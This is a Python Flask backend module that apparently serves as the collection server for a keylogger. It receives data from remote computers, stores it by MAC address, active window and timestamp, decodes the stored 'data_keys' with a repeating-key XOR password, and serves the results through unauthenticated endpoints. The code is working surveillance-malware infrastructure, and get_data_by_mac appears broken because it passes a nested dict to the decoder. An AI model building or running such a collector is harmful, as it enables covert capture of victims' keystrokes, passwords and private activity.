from flask import send_from_directory , request,jsonify
import sys
import os
from dotenv import load_dotenv
import json

sys.path.append(os.path.abspath(os.path.join(os.path.dirname(__file__), '..')))

# Loading environment variables
load_dotenv()
password = os.environ.get('PASSWORD')
file_name = os.environ.get('FILENAME')


# Decryption function
def _decrypt(encrypted_text: list) -> str:
    """
    Receives an encrypted value and
    returns it unencrypted according
    to the password we set in advance
    """
    return ''.join(
            chr(x ^ ord(y))
            for x, y in zip(
                encrypted_text,
                password * (len(encrypted_text) // len(password))
                + password[: len(encrypted_text) % len(password)]
            )
        )

# A function to load the data from the database
def _load_data():
    """
    Returns all data found
     in the database file
    """
    with open(file_name , 'r' , encoding= "utf-8") as file:
        data = json.load(file)
    return data


# Function to return the main HTML page
def index_page():
    """
    Returns the main html page
    """
    return send_from_directory("../front", "index.html")

# A function to return all data
def get_data():
    """
    Returns all data after decoding
    """
    data = _load_data()
    temp_dict = dict()
    for mac, user_dict in data.items():
        temp_dict[mac] = dict()
        for window, data_dict in user_dict.items():
            temp_dict[mac][window] = dict()
            for timestamp, data_keys in data_dict.items():
                temp_dict[mac][window][timestamp] = _decrypt(data_keys)
    return jsonify(temp_dict)

# A function to get all the computers
def get_users():
    """
    Returns all MAC addresses of
     the active computers
    """
    data = _load_data()
    if not data:  
        return jsonify([])
    users = list(data.keys())
    return jsonify(users)

# A function to get information for a specific computer
def get_data_by_mac(mac_address):
    """
    Returns all data for a
     specific computer
    """
    data = _load_data()
    if mac_address in data:
        return jsonify(_decrypt(data[mac_address]))
    else:
        return jsonify({"error": "MAC address not found"}), 404

# Function to store data
def store_data():
    """
    Saves all the data received from
    the computers in a database file
    """
    data = request.get_json()
    try:
        with open(file_name, "r", encoding="utf-8") as file:
            try:
                origin_data = json.load(file)
            except json.JSONDecodeError:
                origin_data = dict()
    except FileNotFoundError:
        origin_data = dict()
    for mac in data:
        if mac not in origin_data:
            origin_data[mac] = dict()
        for window in data[mac]:
            if window not in origin_data[mac]:
                origin_data[mac][window] = dict()
            for timestamp in data[mac][window]:
                if timestamp not in origin_data[mac][window]:
                    origin_data[mac][window][timestamp] = list()
                origin_data[mac][window][timestamp] += data[mac][window][timestamp]

    with open(file_name, "w", encoding="utf-8") as file:
        json.dump(origin_data, file, indent='\t', ensure_ascii=False)


def handle_url_params():
    param = request.args.get("param", "default_value")
    return {"param_received": param}
